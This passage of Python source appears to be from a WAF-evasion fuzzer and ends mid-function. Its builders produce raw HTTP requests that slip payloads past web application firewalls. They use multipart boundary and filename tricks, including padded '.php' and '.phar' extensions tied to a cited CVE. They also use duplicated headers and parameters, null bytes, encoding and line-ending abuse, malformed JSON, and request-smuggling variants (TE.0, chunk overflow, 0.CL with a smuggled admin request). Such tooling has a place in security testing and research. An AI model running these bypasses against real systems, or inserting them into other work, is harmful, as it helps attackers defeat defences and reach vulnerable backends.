    def _build_mp_nested_multipart(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Nested multipart: inner multipart part contains the payload."""
        inner_bound = f"----Inner{_ascii_pad(self.rng, 6)}"
        outer_bound = f"----Outer{_ascii_pad(self.rng, 6)}"
        inner_body = (
            f"--{inner_bound}\r\n"
            f"Content-Disposition: form-data; name=\"nested\"\r\n\r\n"
            f"{payload}\r\n"
            f"--{inner_bound}--\r\n"
        )
        body_str = (
            f"--{outer_bound}\r\n"
            f"Content-Disposition: form-data; name=\"marker\"\r\n\r\n"
            f"{canary}\r\n"
            f"--{outer_bound}\r\n"
            f"Content-Disposition: form-data; name=\"inner\"\r\n"
            f"Content-Type: multipart/mixed; boundary={inner_bound}\r\n\r\n"
            f"{inner_body}\r\n"
            f"--{outer_bound}--\r\n"
        )
        body = body_str.encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: multipart/form-data; boundary={outer_bound}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    def _build_mp_filename_inject(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Payload injected into Content-Disposition filename parameter.

        CVE-2026-33691: CRS filename extension checks can be bypassed by
        appending whitespace, tabs, or null bytes after the extension
        (e.g. '.php ', '.jsp\\t', '.phar\\x00.jpg').  We randomly apply
        one of these padding tricks to dangerous extensions in the payload.
        """
        boundary = f"----WfBound{_ascii_pad(self.rng, 8)}"
        escaped_payload = payload.replace('"', '\\"')

        # 50% chance: apply filename extension whitespace/null padding
        ext_trick = self.rng.choice((
            None, None,  # no trick (original behavior)
            "space", "tab", "null_ext", "trailing_dot", "double_space",
        ))
        if ext_trick == "space":
            filename = f"{escaped_payload}.php "
        elif ext_trick == "tab":
            filename = f"{escaped_payload}.jsp\t"
        elif ext_trick == "null_ext":
            filename = f"{escaped_payload}.phar\x00.jpg"
        elif ext_trick == "trailing_dot":
            filename = f"{escaped_payload}.asp."
        elif ext_trick == "double_space":
            filename = f"{escaped_payload}.php  "
        else:
            filename = escaped_payload

        body_str = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
            f"{canary}\r\n"
            f"--{boundary}--\r\n"
        )
        body = body_str.encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: multipart/form-data; boundary={boundary}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    def _build_mp_duplicate_names(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Same parameter name in two parts: WAF sees first (safe), backend sees last (payload)."""
        boundary = f"----WfBound{_ascii_pad(self.rng, 8)}"
        safe_value = _ascii_pad(self.rng, 12)
        body_str = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"input\"\r\n\r\n"
            f"{safe_value}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"marker\"\r\n\r\n"
            f"{canary}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"input\"\r\n\r\n"
            f"{payload}\r\n"
            f"--{boundary}--\r\n"
        )
        body = body_str.encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: multipart/form-data; boundary={boundary}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    def _build_mp_header_inject(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Extra headers injected into a MIME part."""
        boundary = f"----WfBound{_ascii_pad(self.rng, 8)}"
        body_str = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"field\"\r\n"
            f"X-Injected: {payload}\r\n"
            f"Content-Type: text/html\r\n\r\n"
            f"{canary}\r\n"
            f"--{boundary}--\r\n"
        )
        body = body_str.encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: multipart/form-data; boundary={boundary}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    def _build_mp_epilogue_payload(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Payload placed in the multipart epilogue (after final boundary)."""
        boundary = f"----WfBound{_ascii_pad(self.rng, 8)}"
        body_str = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"field\"\r\n\r\n"
            f"{canary}\r\n"
            f"--{boundary}--\r\n"
            f"{payload}\r\n"
        )
        body = body_str.encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: multipart/form-data; boundary={boundary}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    def _build_mp_preamble_payload(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Payload placed in the multipart preamble (before first boundary)."""
        boundary = f"----WfBound{_ascii_pad(self.rng, 8)}"
        body_str = (
            f"{payload}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"field\"\r\n\r\n"
            f"{canary}\r\n"
            f"--{boundary}--\r\n"
        )
        body = body_str.encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: multipart/form-data; boundary={boundary}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    def _build_mp_boundary_quote(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Multipart boundary quoting: RFC 2046 allows boundary in quotes.

        CT header uses boundary="quoted" but body uses unquoted boundary.
        Some WAFs include the quotes in the boundary value, causing body
        mismatch — they see no valid parts and skip inspection.
        """
        boundary = f"----WfQuote{_ascii_pad(self.rng, 8)}"
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"field\"\r\n\r\n"
            f"{canary}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"data\"\r\n\r\n"
            f"{payload}\r\n"
            f"--{boundary}--\r\n"
        ).encode("latin-1", errors="replace")
        # Quote the boundary in the CT header
        headers = [
            *base_headers,
            f'Content-Type: multipart/form-data; boundary="{boundary}"',
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    def _build_mp_composed(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Composable multipart: randomly combines 1-4 independent primitive
        mutations to explore novel wire structures combinatorially.

        Instead of hardcoding known bypass patterns, this builder samples
        from 16 orthogonal primitives across 5 mutation groups (boundary,
        delimiter, part-encoding, structure, CT-subtype).  Each invocation
        produces a unique combination — the effective search space is ~500+
        structurally distinct multipart variants, most of which have never
        been tested against any WAF.

        Primitives drawn from: WAFFLED (arXiv 2025), WAFManis (IEEE S&P 2024),
        CVE-2026-21876, SicuraNext, terjanq CRS 0-days, RFC 2046/5987/7578.
        """
        rng = self.rng
        raw_bnd = f"----Wf{_ascii_pad(rng, 10)}"

        k = rng.randint(1, 4)
        muts = _pick_mp_muts(rng, k)

        # ── Derive parameters from selected mutations ──
        ct_bnd: str = raw_bnd
        delim = "\r\n"
        ct_sub = "form-data"
        has_term = True
        cte: str | None = None
        charset: str | None = None
        do_empty = False
        do_dup_cd = False
        do_fn_star = False

        for m in muts:
            if m == "bnd_quote":
                ct_bnd = f'"{raw_bnd}"'
            elif m == "bnd_special":
                raw_bnd += rng.choice(["'", "()", "=", "+", ";"])
                ct_bnd = raw_bnd
            elif m == "bnd_null":
                ct_bnd = raw_bnd + "\x00extra"
            elif m == "bnd_ws":
                ct_bnd = f" {raw_bnd} "
            elif m == "delim_lf":
                delim = "\n"
            elif m == "delim_cr":
                delim = "\r"
            elif m == "cte_base64":
                cte = "base64"
            elif m == "cte_qp":
                cte = "quoted-printable"
            elif m == "charset_utf7":
                charset = "utf-7"
            elif m == "charset_ibm037":
                charset = "ibm037"
            elif m == "charset_utf16le":
                charset = "utf-16le"
            elif m == "no_terminator":
                has_term = False
            elif m == "empty_prepend":
                do_empty = True
            elif m == "dup_cd":
                do_dup_cd = True
            elif m == "subtype_mixed":
                ct_sub = "mixed"
            elif m == "subtype_related":
                ct_sub = "related"
            elif m == "filename_star":
                do_fn_star = True

        # ── Encode payload body ──
        raw_body = f"param={canary}&data={payload}"
        if charset:
            try:
                payload_bytes = raw_body.encode(charset)
            except (UnicodeEncodeError, LookupError):
                payload_bytes = raw_body.encode("latin-1", errors="replace")
        else:
            payload_bytes = raw_body.encode("latin-1", errors="replace")

        if cte == "base64":
            payload_bytes = base64.b64encode(payload_bytes)
        elif cte == "quoted-printable":
            payload_bytes = quopri.encodestring(payload_bytes).rstrip(b"\n")

        # ── Assemble multipart body ──
        d = delim.encode("latin-1")
        bnd = f"--{raw_bnd}".encode("latin-1", errors="replace")

        body = b""

        # Optional empty/degenerate part (desync WAF part counting)
        if do_empty:
            v = rng.choice([
                d,                                      # no headers at all
                b"Content-Type: text/plain" + d + d,    # CT but no CD
                b'Content-Disposition: form-data; name="_e"' + d + d,  # zero body
            ])
            body += bnd + d + v

        # Canary part
        body += bnd + d
        body += b'Content-Disposition: form-data; name="field"' + d + d
        body += canary.encode("latin-1", errors="replace") + d

        # Payload part
        body += bnd + d
        if do_dup_cd:
            body += b'Content-Disposition: form-data; name="safe"' + d
        if do_fn_star:
            enc_pl = urllib.parse.quote(payload, safe="")
            body += (
                f"Content-Disposition: form-data; name=\"file\"; "
                f"filename*=UTF-8''{enc_pl}"
            ).encode("latin-1", errors="replace") + d
        else:
            body += b'Content-Disposition: form-data; name="data"' + d
        if cte:
            body += f"Content-Transfer-Encoding: {cte}".encode() + d
        if charset:
            body += f"Content-Type: text/plain; charset={charset}".encode() + d
        body += d + payload_bytes + d

        if has_term:
            body += bnd + b"--" + d

        headers = [
            *base_headers,
            f"Content-Type: multipart/{ct_sub}; boundary={ct_bnd}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    # ── header_leniency ───────────────────────────────────────────

    def _build_hdr_obs_fold(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Header value with obs-fold continuation line hiding payload."""
        body = f"c={canary}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
            f"X-Custom-Input: safe_value\r\n {payload}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_hdr_null_byte(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Null byte in header value to truncate WAF inspection."""
        body = f"c={canary}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        wire = _render_request("POST", f"/api/{request_id}", headers, body)
        # Inject a header with null byte: safe_value\x00<payload>
        inject_header = f"X-Custom-Input: safe_value\x00{payload}".encode("latin-1", errors="replace")
        # Insert before the double CRLF
        hdr_end = wire.find(b"\r\n\r\n")
        if hdr_end >= 0:
            wire = wire[:hdr_end] + b"\r\n" + inject_header + wire[hdr_end:]
        return wire

    def _build_hdr_oversized(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Very long header value to push payload past WAF buffer limit."""
        padding = "A" * self.rng.randint(4000, 8192)
        body = f"c={canary}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
            f"X-Padding: {padding}",
            f"X-After-Pad: {payload}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_hdr_duplicate(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Duplicate header: WAF uses first (safe), backend uses last (payload)."""
        safe_value = _ascii_pad(self.rng, 10)
        body = f"c={canary}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
            f"X-Custom-Input: {safe_value}",
            f"X-Custom-Input: {payload}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_hdr_case_tricks(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Mixed-case header names that WAF may not normalize."""
        case_name = self.rng.choice([
            "x-CUSTOM-input", "X-custom-INPUT", "x-Custom-Input",
            "X-CUSTOM-INPUT", "x-cUsToM-iNpUt",
        ])
        body = f"c={canary}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
            f"{case_name}: {payload}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_hdr_whitespace(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Whitespace before colon in header name."""
        ws = self.rng.choice([" ", "\t", "  ", " \t"])
        body = f"c={canary}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
            f"X-Custom-Input{ws}: {payload}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_hdr_http10_downgrade(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """HTTP/1.0 downgrade: some WAFs handle 1.0 differently.

        HTTP/1.0 doesn't define chunked TE, so a WAF may ignore the body
        of chunked 1.0 requests.  Also, some WAFs skip body inspection
        entirely for 1.0 requests as a fast-path.
        """
        body_data = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        variant = self.rng.choice(["plain", "chunked"])
        if variant == "chunked":
            chunk_size = f"{len(body_data):X}"
            body = f"{chunk_size}\r\n".encode("ascii") + body_data + b"\r\n0\r\n\r\n"
            headers = [
                *base_headers,
                "Transfer-Encoding: chunked",
                "Content-Type: application/x-www-form-urlencoded",
            ]
        else:
            body = body_data
            headers = [
                *base_headers,
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body)}",
            ]
        # Build request with HTTP/1.0 instead of 1.1
        path = f"/api/{request_id}"
        request_line = f"POST {path} HTTP/1.0\r\n"
        header_block = "\r\n".join(headers)
        return (request_line + header_block + "\r\n\r\n").encode("latin-1", errors="replace") + body

    def _build_hdr_method_override(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Method override headers: GET with body + X-HTTP-Method-Override: POST.

        WAF sees GET → skips body inspection.  Backend honours the override
        header and processes the body as a POST request.
        """
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        override_header = self.rng.choice([
            "X-HTTP-Method-Override",
            "X-Method-Override",
            "X-HTTP-Method",
        ])
        headers = [
            *base_headers,
            f"{override_header}: POST",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("GET", f"/api/{request_id}", headers, body)

    def _build_hdr_expect_continue(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Expect: 100-continue with obs-fold or variant spelling.

        CVE-2025-32094 (Akamai desync): some proxies/WAFs skip body inspection
        when they see Expect: 100-continue because they defer body read until
        after forwarding headers.  Combined with obs-fold or Transfer-Encoding
        tricks, the body payload reaches backend uninspected.

        Variants:
        - Plain Expect header (baseline)
        - Expect with obs-fold continuation line hiding real value
        - Expect with mixed-case / whitespace padding
        - Expect + Transfer-Encoding: chunked (desync combo)
        """
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        variant = self.rng.choice(("plain", "obs_fold", "case_pad", "te_chunked"))

        if variant == "plain":
            headers = [
                *base_headers,
                "Expect: 100-continue",
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", f"/api/{request_id}", headers, body)

        elif variant == "obs_fold":
            # Expect value split across obs-fold line
            headers = [
                *base_headers,
                "Expect: 100\r\n -continue",
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", f"/api/{request_id}", headers, body)

        elif variant == "case_pad":
            expect_val = self.rng.choice([
                "100-Continue", "100-CONTINUE", " 100-continue",
                "100-continue ", "100-continue\t",
            ])
            headers = [
                *base_headers,
                f"Expect: {expect_val}",
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body)}",
            ]
            return _render_request("POST", f"/api/{request_id}", headers, body)

        else:  # te_chunked — desync combo
            chunked_body = f"{len(body):x}\r\n".encode() + body + b"\r\n0\r\n\r\n"
            headers = [
                *base_headers,
                "Expect: 100-continue",
                "Transfer-Encoding: chunked",
                "Content-Type: application/x-www-form-urlencoded",
            ]
            return _render_request("POST", f"/api/{request_id}", headers, chunked_body)

    # ── url_normalization ─────────────────────────────────────────

    def _build_url_double_encoding(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Double percent-encoded payload in URL path."""
        encoded = _double_encode(payload)
        path = f"/search/{request_id}?q={encoded}&c={canary}"
        return _render_request("GET", path, base_headers)

    def _build_url_overlong_utf8(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Overlong UTF-8 encoded payload in URL."""
        overlong = _overlong_encode(payload)
        # Percent-encode the overlong bytes for URL.
        encoded = "".join(f"%{b:02X}" for b in overlong)
        path = f"/search/{request_id}?q={encoded}&c={canary}"
        return _render_request("GET", path, base_headers)

    def _build_url_null_injection(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Null byte injection in URL path."""
        path = f"/page/{request_id}%00{payload}?c={canary}"
        return _render_request("GET", path, base_headers)

    def _build_url_path_traversal(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Path traversal segments to confuse WAF path matching."""
        depth = self.rng.randint(2, 5)
        traversal = "/safe" + ("/.." * depth) + f"/target?input={payload}&c={canary}"
        return _render_request("GET", traversal, base_headers)

    def _build_url_unicode_normalize(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Unicode confusable characters in payload."""
        confused = _unicode_confusables(payload)
        path = f"/search/{request_id}?q={confused}&c={canary}"
        # Encode as UTF-8 bytes since we have non-ASCII.
        request_line = f"GET {path} HTTP/1.1".encode("utf-8", errors="replace")
        header_lines = [h.encode("latin-1", errors="replace") for h in base_headers]
        return (
            request_line + b"\r\n"
            + b"\r\n".join(header_lines) + b"\r\n\r\n"
        )

    def _build_url_backslash_slash(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Backslash used in place of forward slash in URL path."""
        path = f"\\admin\\{request_id}?input={payload}&c={canary}"
        return _render_request("GET", path, base_headers)

    def _build_url_hpp(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """HTTP Parameter Pollution: same param in query and body.

        WAF may inspect only the query string value (safe), while the backend
        uses the body value (malicious).  Some backends concatenate both.
        """
        safe_value = "safe_value"
        body = f"q={payload}&c={canary}".encode("latin-1", errors="replace")
        path = f"/search/{request_id}?q={safe_value}&page=1"
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", path, headers, body)

    def _build_url_path_payload(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Payload injected directly into URL path segments.

        WAF may only inspect query/body for attack patterns.  Payload in
        the path may be URL-encoded or double-encoded to avoid detection.
        """
        from urllib.parse import quote as _url_quote
        variant = self.rng.choice(["raw", "single_encode", "double_encode"])
        if variant == "raw":
            encoded_payload = payload
        elif variant == "single_encode":
            encoded_payload = _url_quote(payload, safe="")
        else:
            encoded_payload = _url_quote(_url_quote(payload, safe=""), safe="")
        path = f"/reflect/{encoded_payload}/{request_id}?c={canary}"
        return _render_request("GET", path, base_headers)

    # ── line_terminator ───────────────────────────────────────────

    def _build_lt_bare_lf(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """All CRLF replaced with bare LF."""
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        wire = _render_request("POST", f"/api/{request_id}", headers, body, delimiter=b"\n")
        return wire

    def _build_lt_bare_cr(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """All CRLF replaced with bare CR."""
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        wire = _render_request("POST", f"/api/{request_id}", headers, body, delimiter=b"\r")
        return wire

    def _build_lt_mixed_crlf(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Mix of CRLF and bare LF in headers."""
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        # Rebuild line by line with mixed delimiters (~50% bare LF).
        parts: list[bytes] = []
        line = f"POST /api/{request_id} HTTP/1.1"
        parts.append(line.encode("latin-1", errors="replace"))
        for h in headers:
            delim = b"\n" if self.rng.random() < 0.50 else b"\r\n"
            parts.append(delim + h.encode("latin-1", errors="replace"))
        end_delim = b"\n" if self.rng.random() < 0.50 else b"\r\n"
        return b"".join(parts) + end_delim + end_delim + body

    def _build_lt_null_terminated(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Null bytes inserted within header lines."""
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
            f"X-Custom-Input: safe\x00{payload}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_lt_extra_whitespace(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Extra whitespace in the request line."""
        extra_sp = self.rng.choice(["  ", "\t", " \t ", "   "])
        body = f"param={canary}&data={payload}".encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {len(body)}",
        ]
        # Manually construct request line with extra whitespace.
        request_line = f"POST{extra_sp}/api/{request_id}?q={payload}{extra_sp}HTTP/1.1"
        header_bytes = [request_line.encode("latin-1", errors="replace")]
        header_bytes.extend(h.encode("latin-1", errors="replace") for h in headers)
        return b"\r\n".join(header_bytes) + b"\r\n\r\n" + body

    # ── content_type_confusion (v3.4 JSON deep tricks) ────────────

    def _build_ct_json_field_wrapper(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED Field Wrapper Manipulation: null/whitespace between "key" and colon.

        Some JSON parsers accept whitespace and even null bytes between the key
        and the ``:`` separator; regex-based WAF rules that match ``"key":"value"``
        do not.
        """
        sep = self.rng.choice([b"\x00:", b" \x00 :", b"\t:", b"\r\n:", b"\x00 :"])
        body = b"{\"param\"" + sep + b"\"" + canary.encode("ascii") + b"\","
        body += b"\"data\"" + sep + b"\"" + payload.encode("latin-1", errors="replace") + b"\"}"
        headers = [
            *base_headers,
            "Content-Type: application/json",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_ct_json_field_name_null(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED Field Name Hack: null byte / control char inside quoted JSON key.

        WAF regex matching ``"data"`` fails on ``"da\\x00ta"`` but parsers that
        accept any byte between quotes still treat it as a string key.
        """
        splice_char = self.rng.choice([b"\x00", b"\x01", b"\x1f"])
        key_parts = ["par", "am"] if self.rng.random() < 0.5 else ["dat", "a"]
        mangled_key = key_parts[0].encode("ascii") + splice_char + key_parts[1].encode("ascii")
        body = b"{\"" + mangled_key + b"\":\"" + payload.encode("latin-1", errors="replace") + b"\","
        body += b"\"canary\":\"" + canary.encode("ascii") + b"\"}"
        headers = [
            *base_headers,
            "Content-Type: application/json",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_ct_json_quote_replace(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED Double Quote Replacement: single-quote or bare-identifier JSON.

        RFC 8259 requires double quotes, but relaxed parsers (e.g., some
        JavaScript ``eval``/``Function`` paths, older node libraries) accept
        single-quoted strings or bare identifier keys. WAF regex tied to the
        ``"`` character misses these.
        """
        variant = self.rng.choice(["single_quote", "bare_key", "mixed"])
        safe_payload = payload.replace("'", "\\'").encode("latin-1", errors="replace")
        if variant == "single_quote":
            body = b"{'param':'" + canary.encode("ascii") + b"','data':'" + safe_payload + b"'}"
        elif variant == "bare_key":
            body = b"{param:\"" + canary.encode("ascii") + b"\",data:\"" + payload.encode("latin-1", errors="replace") + b"\"}"
        else:
            body = b"{param:'" + canary.encode("ascii") + b"',data:'" + safe_payload + b"'}"
        headers = [
            *base_headers,
            "Content-Type: application/json",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_ct_json_ct_removal(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED CT Removal: JSON body with no Content-Type header.

        Some WAFs only inspect bodies when they can identify the MIME type;
        removing Content-Type entirely can bypass the inspection while backends
        content-sniff and still parse JSON.
        """
        import json as _json
        obj = {"param": canary, "data": payload}
        body = _json.dumps(obj).encode("utf-8")
        # Deliberately omit Content-Type.
        headers = [
            *base_headers,
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    # ── body_encoding (v3.4 2024 smuggling variants) ──────────────

    def _build_enc_te_zero(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Imperva 2024 TE.0: ``Transfer-Encoding: 0`` — some LB parse as
        chunked, origin parses as CL → desync smuggling.
        """
        safe_body = f"canary={canary}".encode("ascii")
        payload_bytes = payload.encode("latin-1", errors="replace")
        chunked_body = (
            f"{len(safe_body):x}".encode("ascii") + b"\r\n" + safe_body + b"\r\n" +
            f"{len(payload_bytes):x}".encode("ascii") + b"\r\n" + payload_bytes + b"\r\n" +
            b"0\r\n\r\n"
        )
        headers = [
            *base_headers,
            "Transfer-Encoding: 0",
            f"Content-Length: {len(safe_body)}",
            "Content-Type: application/x-www-form-urlencoded",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, chunked_body)

    def _build_enc_chunk_overflow(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """Imperva 2024: chunk size with 32/64-bit overflow values. Some
        parsers wrap to negative or zero, others truncate — causing length
        disagreement between WAF and origin.
        """
        overflow_size = self.rng.choice([
            "ffffffff",          # 32-bit max
            "ffffffffffffffff",  # 64-bit max
            "FFFFFFFF00000000",  # upper half filled
            "100000000",         # 33-bit (one past 32-bit)
        ])
        body_data = f"canary={canary}&data={payload}".encode("latin-1", errors="replace")
        body = (
            overflow_size.encode("ascii") + b"\r\n" +
            body_data + b"\r\n" +
            b"0\r\n\r\n"
        )
        headers = [
            *base_headers,
            "Transfer-Encoding: chunked",
            "Content-Type: application/x-www-form-urlencoded",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, body)

    def _build_enc_zero_cl(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """PortSwigger 2024 0.CL smuggle: ``Content-Length: 0`` but a full
        follow-on request appears in the body. Frontends see an empty body,
        backend parses the smuggled request off the pipeline.
        """
        smuggled = (
            b"GET /admin/" + canary.encode("ascii") + b" HTTP/1.1\r\n"
            b"Host: target.local\r\n"
            b"X-Smuggled: " + payload.encode("latin-1", errors="replace") + b"\r\n"
            b"\r\n"
        )
        headers = [
            *base_headers,
            "Content-Length: 0",
            "Content-Type: application/x-www-form-urlencoded",
        ]
        return _render_request("POST", f"/api/{request_id}", headers, smuggled)

    # ── multipart_tricks (v3.4 WAFFLED Boundary Header Tampering) ─

    def _build_mp_boundary_header_tamper(
        self, *, payload: str, canary: str, request_id: str,
        base_headers: list[str],
    ) -> bytes:
        """WAFFLED Boundary Header Tampering: append extra parameters to the
        Content-Type boundary directive with semicolons / whitespace so the
        WAF and backend disagree on where the boundary value ends.
        """
        boundary = f"----wf{_ascii_pad(self.rng, 8)}"
        tamper = self.rng.choice([
            f'; extra=confuse',
            f';charset=utf-8',
            f' ;x=y',
            f'\t;foo=bar',
            f';" ;real=',
        ])
        ct_value = f"multipart/form-data; boundary={boundary}{tamper}"
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"canary\"\r\n\r\n"
            f"{canary}\r\n"
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"data\"\r\n\r\n"
            f"{payload}\r\n"
            f"--{boundary}--\r\n"
        ).encode("latin-1", errors="replace")
        headers = [
            *base_headers,
            f"Content-Type: {ct_value}",
            f"Content-Length: {len(body)}",
        ]
        return _render_request("POST", f"/upload/{request_id}", headers, body)

    # ── xml_content lane (v3.4 WAFFLED XML classes) ───────────────

    def _xml_ct(self) -> str:
        """Pick a random XML Content-Type value."""
        return self.rng.choice([
            "application/xml",
            "text/xml",
            "application/soap+xml",
